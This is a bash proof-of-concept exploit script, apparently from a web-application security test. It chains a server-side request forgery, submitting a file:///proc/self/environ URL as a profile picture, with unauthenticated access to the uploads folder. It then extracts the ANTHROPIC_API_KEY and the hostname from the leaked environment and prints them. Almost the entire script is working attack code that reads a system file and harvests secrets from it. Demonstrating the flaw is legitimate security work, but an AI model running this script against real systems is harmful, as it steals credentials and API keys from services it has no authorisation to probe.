#!/bin/bash

# POC: Unauthenticated Access to Uploaded Files Containing Sensitive Information
# This script demonstrates:
# 1. Using SSRF to read /proc/self/environ
# 2. Accessing the downloaded file without authentication
# 3. Extracting sensitive API keys from the response

TARGET="${1:-http://localhost}"
SESSION_COOKIE="${2:-eyJ1c2VybmFtZSI6InVzZXIxIn0.aQo2Mg.PdHMgWUgFcWjVeHjj9ZDFstVsV0}"

echo "[*] Unauthenticated Uploads Access POC"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Use SSRF to read /proc/self/environ
echo "[+] Step 1: Exploiting SSRF to read /proc/self/environ via profile endpoint"
echo "[*] Sending malicious profile_picture_url with file:// scheme..."
echo ""

SSRF_RESPONSE=$(curl -s -b "session=$SESSION_COOKIE" \
  -d "profile_picture_url=file:///proc/self/environ" \
  -X POST "$TARGET/profile")

echo "[*] SSRF Response:"
echo "$SSRF_RESPONSE"
echo ""

# Step 2: Access downloaded environment file without authentication
echo "[+] Step 2: Accessing downloaded environ file WITHOUT authentication"
echo "[*] Attempting unauthenticated HTTP GET to /static/uploads/environ..."
echo ""

ENVIRON_RESPONSE=$(curl -s -i "$TARGET/static/uploads/environ" 2>&1)

echo "[*] Response:"
echo "$ENVIRON_RESPONSE"
echo ""

# Step 3: Extract and analyze sensitive information
echo "[+] Step 3: Analyzing response for sensitive information"
echo ""

# Check if we got a 200 response (authentication bypass confirmed)
if echo "$ENVIRON_RESPONSE" | grep -q "200 OK\|HTTP/1.1 200"; then
    echo "[✓] VULNERABILITY CONFIRMED: File accessed without authentication (HTTP 200)"
    echo ""
    
    # Try to extract API keys
    BODY=$(echo "$ENVIRON_RESPONSE" | tail -n +1 | sed '1,/^$/d')
    
    if echo "$BODY" | grep -q "ANTHROPIC_API_KEY"; then
        echo "[✓] CRITICAL: ANTHROPIC_API_KEY found in response"
        API_KEY=$(echo "$BODY" | grep "ANTHROPIC_API_KEY" | cut -d'=' -f2)
        echo "[!] Exposed API Key: $API_KEY"
        echo ""
    fi
    
    if echo "$BODY" | grep -q "HOSTNAME"; then
        echo "[✓] CRITICAL: System HOSTNAME exposed"
        HOSTNAME=$(echo "$BODY" | grep "HOSTNAME" | cut -d'=' -f2)
        echo "[!] Container Hostname: $HOSTNAME"
        echo ""
    fi
    
    echo "[*] Other sensitive environment variables exposed:"
    echo "$BODY" | head -20
    echo ""
    echo "[!] VULNERABILITY SEVERITY: CRITICAL"
    echo "[!] Impact: Unauthenticated users can access sensitive files with API keys and credentials"
    
    exit 0
else
    echo "[✗] File not found or authentication is enforced"
    exit 1
fi